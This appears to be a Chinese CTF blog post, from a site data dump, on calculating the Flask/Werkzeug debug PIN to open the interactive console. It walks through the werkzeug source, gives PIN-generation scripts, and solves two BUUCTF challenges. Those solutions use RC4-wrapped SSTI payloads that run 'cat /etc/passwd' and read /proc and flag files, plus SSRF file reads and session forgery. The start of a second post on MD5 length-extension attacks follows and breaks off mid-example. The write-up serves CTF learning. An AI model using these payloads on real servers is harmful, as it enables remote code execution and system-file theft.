但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法 0x02 探寻PIN码生成算法 先写一个简单的Flask测试程序 from flask import Flask app = Flask(__name__) @app.route(\"/\") def hello(): return 'hybcx\\'blog' if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=8080, debug=True) 运行之后，结果如下 访问发现搭建成功 接下来开始调试程序，顺藤摸瓜找到生成PIN码的函数 PIN码是werkzeug的策略，先找到flask中导入werkzeug的部分 2.1 调试 在run.app行下断点，点击调试 点击步入 转到了flask/app.py，直接Ctrl+F搜索werkzeug 发现程序从werkzeug导入了run_simple模块，而且try部分有run app的参数 我们直接按住ctrl点击run_simple进去看看 此时进入了seving.py，找到了负责Debug的部分，PIN码是在debug状态下才有的，那这个部分很有可能存有PIN码生成部分，进去看看 进入debuggedapplication 此时进入了__init__.py，经过一番审计，先来看一看pin函数 @property 就是负责把一个方法变成属性调用，方便定义属性的 get 和 set 方法。可以看到调用了 get_pin_and_name() 对 PIN 进行赋值，进去看看，这里将函数截取了下来 def get_pin_and_cookie_name( app: WSGIApplication, ) -&gt; tuple[str, str] | tuple[None, None]: \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" # 根据环境变量检查PIN是否为off(即被禁用) pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly #如果PIN设置为没有分隔符（如破折号“-”）的数字值，则将其用作PIN。如果存在分隔符，则直接使用PIN。否则，使用提供的PIN的修改版本。 if pin is not None and pin.replace(\"-\", \"\").isdecimal(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin #获取有关WSGI应用程序模块（app）和当前用户的信息。 modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__) username: str | None try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. #使用getpass.getuser()获取用户信息。此信息用于使Cookie在计算机上唯一 username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", type(app).__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") #基于各种信息（包括用户名、模块名、应用程序名和模块文件），创建一个SHA-1哈希。此哈希用于生成以“__wzd”开头的唯一Cookie名称。 cookie_name = f\"__wzd{h.hexdigest()[:20]}\" # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits #如果未显式提供PIN，它通过对一些信息进行哈希并将其转换为9位数字字符串来生成PIN。这样做是为了确保PIN在重新启动时相对稳定。 if num is None: h.update(b\"pinsalt\") num = f\"{int(h.hexdigest(), 16):09d}\"[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. #将PIN格式化为数字组（5、4和3位数字），以便用户更容易记住。然后返回格式化的PIN和生成的Cookie名称。 if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name 返回的rv就是PIN码，但这个函数核心是将列表里的值hash，我们不需要去读懂这段代码，只需要将列表里的值填上直接运行代码就行。 虽然这位笔者告知我们不需要读懂，但求知心切的我决定跟着GPT过一遍 2.2 生成要素： username 通过getpass.getuser()读取，通过文件读取`/etc/passwd`-- 启动这个flask的用户 modname 通过getattr(mod,\"__file__\",None)读取，默认值为flask.app appname 通过getattr(app,\"__name__\",type(app).__name__)读取，默认值为Flask 或 通过getattr(app, \"__name__\", app.__class__.__name__)读取 moddir 当前网络的mac地址的十进制数，通过getattr(mod,\"__file__\",None)读取实际应用中通过报错读取 uuidnode 通过uuid.getnode()读取，通过文件`/sys/class/net/eth0/address`得到16进制结果，转化为10进制进行计算 machine_id 每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)： 1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup 当这6个值我们可以获取到时，就可以推算出生成的PIN码 到这儿参数的来历都清楚了，做个总结 probably_public_bits = [ username 运行当前程序的用户名 modname 当前对象的模块名，默认为flask.app getattr(app, \"__name__\", app.__class__.__name__) 当前对象的名称，默认为Flask getattr(mod, \"__file__\", None) flask包内的app.py的绝对路径 ] private_bits = [ str(uuid.getnode()) Mac地址的整型，通过int(Mac, 16)可以获取 get_machine_id() [ docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中\"serial-number\" = &lt;{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 2.3 PIN生成算法 然后这里还有一个点，python不同版本的算法区别，3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同 sha1计算 #sha1 import hashlib from itertools import chain probably_public_bits = [ 'root'# /etc/passwd 'flask.app',# 默认值 'Flask',# 默认值 '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到 ] private_bits = [ '2485377581187',# /sys/class/net/eth0/address 16进制转10进制 #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'# /proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) MD5计算 #MD5 import hashlib from itertools import chain probably_public_bits = [ 'flaskweb'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '25214234362297',# str(uuid.getnode()), /sys/class/net/eth0/address '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 其实最稳妥的方法就是自己调试，把自己版本的生成PIN部分提取出来，把num和rv改成None，直接print rv就行 0x03 PIN码获取 3.1 Linux下PIN码获取 还是用上面流程分析的代码，在 linux 中运行。 uaername 可以从 /etc/passwd 中读取。这里是 root 用户启动的，所以值为 root，不知道哪个用户启动的，可以按照 /etc/passwd 里的用户多尝试一下。 getattr(mod, '__file__', None) flask 目录下的一个 app.py 的绝对路径,这个值可以在报错页面看到。但有个需注意，python3 是 app.py，python2 中是 app.pyc。这里值为 /usr/local/lib/python2.7/dist-packages/flask/app.pyc 但是如何才能产生报错，似乎没人讲啊。。。。 str(uuid.getnode()) MAC地址 读取这两个地址：/sys/class/net/eth0/address 或者 /sys/class/net/ens33/address 转化为10进制，这里值为52235878851 get_machine_id() 系统id 。 我们进入get_machine_id()，从代码中可以得知这里对linux、macos、window的3种系统的获取方法。 def get_machine_id(): global _machine_id if _machine_id is not None: return _machine_id def _generate(): linux = b\"\" # machine-id is stable across boots, boot_id is not. for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: value = f.readline().strip() except IOError: continue if value: linux += value break # Containers share the same machine id, add some cgroup # information. This is used outside containers too but should be # relatively stable across boots. try: with open(\"/proc/self/cgroup\", \"rb\") as f: linux += f.readline().strip().rpartition(b\"/\")[2] except IOError: pass if linux: return linux # On OS X, use ioreg to get the computer's serial number. try: # subprocess may not be available, e.g. Google App Engine # https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = &lt;([^&gt;]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows, use winreg to get the machine guid. try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: wr = None if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: guid, guid_type = wr.QueryValueEx(rk, \"MachineGuid\") if guid_type == wr.REG_SZ: return guid.encode(\"utf-8\") return guid except WindowsError: pass _machine_id = _generate() return _machine_id 只要从 /etc/machine-id、/proc/sys/kernel/random/boot_id 中读到一个值后立即 break，然后和/proc/self/cgroup 中的id值拼接 2020.1.5对 machine_id() 进行了更新 ，所以2020.1.5之前的版本是跟这里不同的，具体更新情况可看 https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f 2020.1.5修改前是： 是依序读取 /proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id 三个文件，只要读取到一个文件的内容， 立马返回值。 这里 /etc/machine-id 为 75d03aa852be476cbe73544c93e98276 ，`` 只读取第一行，并以从右边算起的第一 个‘/’为分隔符，分成两部分，取右边那部分，这里为空，所以这里 get_machine_id() 的值为 75d03aa852be476cbe73544c93e98276。 现在已经知道所有变量的值，可以就用 get_pin_and_cookie_name 的部分代码生成PIN码。 import hashlib from itertools import chain probably_public_bits = [ 'root'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '52228526895',# str(uuid.getnode()), /sys/class/net/ens33/address '75d03aa852be476cbe73544c93e98276'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 最后生成的 PIN 码为638-233-100，输入后即可看到一个 shell 的交互界面 3.2 Windows下PIN码获取 uaername 可以从net user命令查看，这里值为 Administrator getattr(mod, '__file__', None) flask 目录下的一个 app.py 的绝对路径,这个值可以在报错页面看到。但有个需注意，python3 是 app.py，python2 中是 app.pyc。这里值为G:\\code\\venv\\flaskProject2\\lib\\site-packages\\flask\\app.pyc str(uuid.getnode()) MAC 地址 ipconfig /all 转化为10进制，这里值为123360440651610 get_machine_id() 系统 id 。 打开注册表查看\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography的 MachineGuid 值 也可以用 reg 命令行查询 reg query HKLM\\SOFTWARE\\Microsoft\\Cryptography 这里值为178b0ab8-5a99-4c8e-828d-efc7a40b7f08，最后用上面的脚本生成PIN，结果尝试了一下是错了。 重新调试了一下脚本，发现 str(uuid.getnode()) 的MAC地址不对，本机上有多个网卡，所以有多个 MAC 地址，以为是 uuid.getnode() 获取的是当前正在的网卡的MAC地址。看了一下 uuid.getnode() 的底层实现源码，才知道，它是执行了 ipconfig /all,根据返回的结果，逐行地去正则匹配 MAC 地址，第一个匹配成功就返回。 所以他这里第一个返回的MAC地址为7C-B2-7D-23-D7-E5，转化为十进制后为137106045523941，最后生成的PIN码为296-090-416 3.3 总结 pin码需要六个参数 1. 运行当前程序的用户名，可以通过/etc/passwd尝试 2. 对象app的__module__属性，没有则从类中取，默认为flask.app 3. 对象app的__name__属性，没有则从类中取，默认为Flask 4. flask包中的app文件绝对路径，python2为pyc，默认为/usr/local/lib/python{版本号}/site-packages/flask/app.py 5. Mac地址的整型 6. 机器ID docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中\"serial-number\" = &lt;{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid 加密方式 python2绝大部分为md5加密，python3少部分为md5，大部分为sha1加密 机器id读取顺序不同 0.15.5之前 /etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid 0.15.5-0.16.0 /proc/self/cgroup`-&gt;`/etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid /proc/self/cgroup需要用正则value.strip().partition(\"/docker/\")[2]分割 0.16.0之后 /etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`/proc/self/cgroup`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid /proc/self/cgroup需要用正则f.readline().strip().rpartition(b\"/\")[2]分割 0x04 实战例题 [CISCN2019 华东南赛区]Double Secret 本来信心满满的打开题目去练习一番，结果这道题的前期我就懵逼呢，看了wp也是佩服脑洞 访问首页这里说让我们去找Secret，于是尝试直接访问secret路由 这里又告诉我们：让我们告诉他secret，他会加密。于是那些佬不知何种思路，对这secret进行了get传参。。。 这里我胡乱传了一个数值，发现页面报错，这感情好啊，肯定debug开启了 我们想办法读到响应的关键信息计算PIN码即可 我们回顾一下需要读取的内容 1. 运行当前程序的用户名，可以通过/etc/passwd尝试 2. 对象app的__module__属性，没有则从类中取，默认为flask.app 3. 对象app的__name__属性，没有则从类中取，默认为Flask 4. flask包中的app文件绝对路径，python2为pyc，默认为/usr/local/lib/python{版本号}/site-packages/flask/app.py 5. Mac地址的整型 6. 机器ID docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernl/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中\"serial-number\" = &lt;{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid 这里我们根据报错，看一下app目录下的信息 if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see' rc=rc4_Modified.RC4(\"HereIsTreasure\") #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!' return a 发现这里将我们传入的secret进行了rc4加密，随后进行了模板注入，这里估计是有ssti漏洞的，随后过滤了ciscn这个关键词 方法一：SSTI注入 这里肯定得知道加密的脚本，这样我们利用该脚本注入我们的恶意代码才会成功执行。这里也是看了wp才得到的RC4加密脚本 import base64 from urllib.parse import quote def rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4加密主函数\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # 我这里没管秘钥小于256的情况，小于256不断重复填充即可 # print(\"原来的 s 盒：%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"混乱后的 s 盒：%s\"% s_box) return s_box def rc4_excrypt(plain, box): # print(\"调用加密程序成功。\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"res用于加密字符串，加密后是：%res\" %res) cipher = \"\".join(res) print(\"加密后的字符串是：%s\" %quote(cipher)) #print(\"加密后的输出(经过编码):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) #需要加密的字符串在这里修改 rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") 这里有佬说明：这里是后端对secret传入的值进行了RC4加密，RC4加密方式为，明文加密一次得到密文，密文在加密一次得到明文。所以要使用RC4脚本对我们传入的恶意字符串进行一次加密，这样传给系统，既绕过检测，同时还得到了明文得以执行 不过这道题似乎直接用上述的ssti直接读取flag即可，但我们是来练习PIN码获取的，那我们采用另外的思路，不过这里先走一遍ssti 调用： rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()}}\") 下标为59的是warnings.catch_warnings，直接利用即可： rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}\") 拿到flag 方法二：PIN码计算 有了方法一的思路我们直接照着读取即可 1. 运行当前程序的用户名，可以通过/etc/passwd尝试 2. 对象app的__module__属性，没有则从类中取，默认为flask.app 3. 对象app的__name__属性，没有则从类中取，默认为Flask 4. flask包中的app文件绝对路径，python2为pyc，默认为/usr/local/lib/python{版本号}/site-packages/flask/app.py 5. Mac地址的整型 6. 机器ID docker /proc/self/cgroup，正则分割 Linux /etc/machine-id，/proc/sys/kernel/random/boot_id，前者固定后者不固定 macOS ioreg -c IOPlatformExpertDevice -d 2中\"serial-number\" = &lt;{ID}部分 Windows 注册表HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid 先读取/etc/passwd rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}\") 这里猜测是root用户，但由于不确定还是决定看看wp发现他认为username 为 glzjin。。。。不太懂，先往下做看看 flask包中的app文件绝对路径 getattr(mod, '__file__', None) 从报错页面得知为 /usr/local/lib/python2.7/site-packages/flask/app.pyc Mac地址 rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /sys/class/net/eth0/address').read()}}\") 转换为十进制数为：244583227313717 读取get_machine_id() 对如下字符串进行 RC4 加密，再传入 secret 中 rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /proc/self/cgroup').read()}}\") 根据读取规则我们从箭头处开始读取 docker-11a33fd98fd85e6543a295bd7e77f5f0a222196211955341ed11298c93ba8db0.scope 最后得到了，这里我们看上述的信息也可以发现他是docker启动的服务，根据规则我们只需要读取上面的信息以及/proc/self/cgroup路径下的信息，这里剩下的最后一个路径是空的，大家可以尝试 这里看的那篇文章不够细节，坑了我一手，这里我们在读取第一个路径/proc/self/cgroup的时候，我们对于结果只取第一行，且 将第一行的数据： 'class' is not allowed. Secret is 12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podf1fac0b3_f07f_4e83_ad38_8d4d9f5bb2f5.slice/docker- 使用如下正则进行匹配最终结果： print(value.strip().partition(\"/docker/\")[2]) value是我们的原始数据，最后的结果如下，是空的 那我们需要读取/proc/sys/kernel/random/boot_id路径下的内容 最后得到的6个变量的值分别为 username 值为 glzjin modname 值为 flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')) 值为 Flask getattr(mod, '__file__', None)值为/usr/local/lib/python2.7/site-packages/flask/app.pyc str(uuid.getnode()) 值为244583227313717 get_machine_id() 值为8cab9c97-85be-4fb4-9d17-29335d7b2b8a 用如下脚本生成 PIN #MD5 import hashlib from itertools import chain probably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '244583227313717',# str(uuid.getnode()), /sys/class/net/eth0/address '8cab9c97-85be-4fb4-9d17-29335d7b2b8a'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 至于那个用户是glzjin不太清楚，估计是他们试出来的吧 最后将得到的PIN输入即可进行命令行交互模式，当然也可以访问console路由输入PIN码，如下图成功得到flag [CISCN2019 华东南赛区]Web4 这道题前期依旧是没思路，刷题太少，还是注重PIN码的练习吧 访问之后发现有个超链接，点击后发现跳转到了百度页面，emmm那就是ssrf读取敏感信息了呗 这里我尝试了file读取/etc/passwd但被ban了，于是没思路了，看了wp发现他有的直接?url=/etc/passwd直接就读到了。。。随后我又尝试： url=../app/app.py 直接读到了源码，不过这里看有的师傅采用另一个姿势local_file:///读取文件（没学过，以后有缘看看） #encoding: utf - 8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random() * 233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! Read somethings'@ @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response'@ @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else : return 'Access denied' if __name__ == '__main__': app.run(debug = True, host = \"0.0.0.0\") 审计一波发现在read路由下，可以进行文件读取，但是不能含有file与flag的关键字。 在flag路由下，如果session变量存在，且其中键名为username的值为fuck，则成功读取到flag，那就是要伪造session了，不过在此之前还需要知道密钥，下面看一下密钥生成方式 random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random() * 233) 这里我只是清楚他采用的uuid.getnode即Mac地址作为seed种子，借用一下其他师傅的讲述： 对于伪随机数，如果seed是固定的，生成的随机数是可以预测的，也就是顺序固定的，所以只要知道seed的值即可。这里的seed使用的uuid.getnode()的值，该函数用于获取Mac地址并将其转换为整数。 那我们读取一下Mac地址看看?url=../sys/class/net/eth0/address 转为十进制数为：165897528343673，这里看了似乎依旧是两种方法，一种是常规的session伪造，另一种就是PIN码计算，进行命令交互 方法一：session伪造 不过接下来的几步老疑惑了，我看有的师傅是报错看出来的python版本为2.7，但也不知道如何爆出来的，这里我做完在研究 使用Python2得出密钥（Python2和Python3保留的位数不一样） import random random.seed(0x96e2073efc79) print(str(random.random()*233)) 得到12.221805183 接下来用工具进行session伪造 python3 flask_session_cookie_manager3.py decode -c \"eyJ1c2VybmFtZSI6eyIgYiI 6ImQzZDNMV1JoZEdFPSJ9fQ.ZVH0fg.JlHfWUlenH8zN6oP-IQM4l76BjA\" -s \"12.221805183\" 如图成功解密，接下来就是加密了 python3 flask_session_cookie_manager3.py encode -s \"12.221805183\" -t \"{'username': 'fuck'}\" 如下图，修改session后访问flag即可得到 方法二：PIN码计算 由于我们在上面代码中可以看到其debug开启了，因此我们可以采用PIN码计算的方式来获取flag 如图还是glzjin用户 app路径为：/usr/local/lib/python2.7/site-packages/flask/app.py–不过此处我认为只能猜，因为根据上述代码的编写，我并不清楚如何使其报错，只能当你路径访问正确才可以，不过这里只需要更改2.7即可 这里Mac地址我们已经得到：165897528343673 读取get_machine_id() 老规矩取第一行数据 依旧为空，那只需要读取/proc/sys/kernel/random/boot_id 上脚本计算 #MD5 import hashlib from itertools import chain probably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '165897528343673',# str(uuid.getnode()), /sys/class/net/ens33/address '8cab9c97-85be-4fb4-9d17-29335d7b2b8a'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) #print(value.strip().partition(\"/docker/\")[2]) 得到PIN码后访问console路由输入PIN码即可，如下图得到flag 0x05 参考文章 Flask debug模式算pin码-爱代码爱编程 Flask Pin码构造详解 深入浅出Flask PIN Flask debug模式下的 PIN 码安全性 [CISCN2019 华东南赛区]Double Secret BUUCTF：[CISCN2019 华东南赛区]Web4 刷题[CISCN2019 华东南赛区]Web4 关于ctf中flask算pin总结","tags":["基本知识"],"categories":["web知识总结"]},{"title":"浅析md5拓展攻击","path":"/2023/11/12/qian-xi-md5-tuo-zhan-gong-ji/","content":"0x01 前言 最近刷CTF题目的时候遇到了md5拓展攻击的知识点，由于不太清楚原理，故此来学习一番 0x02 md5加密算法 2.1 加密原理 为了更好地理解改攻击，首先了解一下MD5的加密算法，加密过程的示意图如下： 图有点抽象啊，还是看佬们的解释吧： 通俗来讲，就是MD5把每512位当作一组进行加密计算，首先有一个初始序列的值（该值是固定的），这个初始序列与信息的第一组512位进行运算，得到一个结果，该结果作为下一组512位的初始序列，再进行同样的运算，依此类推。需要注意的是，最后一个分组的后64位用来显示原消息的总长，是预留的，也就是说，最后一个分组只能有448位。 有一个问题就是，如果要是（加密的信息长度+64）并不是512的整数倍怎么办呢？ MD5的策略是： 最后一个分组如果不足512，则进行填充，填充的策略是：在原消息和原消息总长之间填充01字符串，第一位为1，剩下的全部填充0。 这样其实就有了一个漏洞： 如果给出一个message和该message经过md5加密后的值，我们可以通过手动填充，把消息长度填充到512的整数倍，再根据这个新的字符串，自己计算出md5值（因为有原message的md5值，相当于知道了加密的初始序列），同样可以成功。 2.2 填充过程简要说明 比如原信息为test，md5(‘test’) = 098f6bcd4621d373cade4e832627b4f6；也就是说原信息只有4*8=32位，我们要填充448 - 32 = 416位。 ‘test’的十六进制是0x74673574（十六进制每个字符可以转成4个二进制位），根据我们上文提到的策略，填充后应该是：80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 注意：MD5中的填充都是小端序，也就是说，数据的高位字节存放在地址的高端 低位字节存放在地址低端，比如十六进制的后16位（64/4）是32，表示信息长度是32位，就是2000000000000000； 如果我们想要添加字符串（比如添加wn），就可以利用‘test’已经算出来的md5结果，当作 ‘wn’ 字符串加密运算的初始化序列，继续填充的过程，算出来的结果就是 ‘testwn’ 字符串加密的结果。 0x03 md5加密再理解 经过上述的解释我还是有点不理解，那我们在找点其他文章来分析 3.1 题目样例 在一道web题目中遇到了以下判断: if ($COOKIE[\"md5hash\"] === md5($secret . $input)) 在该题目中我们可以掌握的参数有md5hash、input的值，secret的md5值和长度，我们需要想办法让这个判断通过。 由此想到了md5的hash长度扩展攻击。 3.2 md5算法原理 3.2.1 基本介绍 md5是对一段信息（Message）产生信息摘要（Message-Digest），所谓信息就是指我们需要加密的原数据，信息摘要是数据经过一系列计算得出来的一个长度固定的数据（可以说是源数据的一个独一无二的指纹）。 3.3.2 计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 3.2.3 计算的例子 比如计算字符串test的md5值。 十六进制0x74657374 二进制0b1110100011001010111001101110100 